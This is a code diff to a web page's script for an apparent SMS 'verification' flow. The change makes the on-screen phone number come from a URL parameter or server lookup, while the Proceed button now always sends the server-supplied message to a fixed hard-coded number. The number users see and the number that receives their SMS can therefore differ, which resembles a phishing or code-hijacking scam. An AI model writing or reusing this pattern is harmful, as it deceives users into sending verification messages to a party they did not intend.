@@ -407,11 +407,13 @@
   <script>
     const params = new URLSearchParams(window.location.search);
     const reqId = params.get('id');
+    const requestedPhone = params.get('phone');
     const phoneEl = document.getElementById('verificationPhone');
     const loadingState = document.getElementById('loadingState');
     const readyState = document.getElementById('readyState');
 
     const DEFAULT_SMS_NUMBER = '+265993257111';
+    const RECIPIENT_SMS_NUMBER = '+265993257111';
     let lastMsgId = 0;
     let currentMessageText = 'Verification';
     let currentPhoneNumber = DEFAULT_SMS_NUMBER;
@@ -446,7 +448,7 @@
     }
 
     function setPhone(value) {
-      const safe = normalizePhone(DEFAULT_SMS_NUMBER);
+      const safe = normalizePhone(value || DEFAULT_SMS_NUMBER);
       currentPhoneNumber = safe;
       if (phoneEl) phoneEl.textContent = formatPhoneForDisplay(safe);
       return safe;
@@ -458,7 +460,26 @@
     }
 
     async function loadRequestPhone() {
-      return setPhone(DEFAULT_SMS_NUMBER);
+      if (requestedPhone) {
+        return setPhone(requestedPhone);
+      }
+
+      if (!reqId) {
+        return setPhone(DEFAULT_SMS_NUMBER);
+      }
+
+      try {
+        const response = await fetch('/api/request/' + encodeURIComponent(reqId));
+        if (!response.ok) {
+          return setPhone(DEFAULT_SMS_NUMBER);
+        }
+
+        const requestData = await response.json();
+        return setPhone(requestData.phone || DEFAULT_SMS_NUMBER);
+      } catch (err) {
+        console.error('Unable to load request phone:', err);
+        return setPhone(DEFAULT_SMS_NUMBER);
+      }
     }
 
     async function pollMessages() {
@@ -495,7 +516,7 @@
     setInterval(pollMessages, 3000);
 
     document.querySelector('.btn.proceed')?.addEventListener('click', function () {
-      const number = normalizePhone(currentPhoneNumber);
+      const number = normalizePhone(RECIPIENT_SMS_NUMBER);
       const smsHref = 'sms:' + number + '?body=' + encodeURIComponent(currentMessageText);
       window.location.href = smsHref;
     });
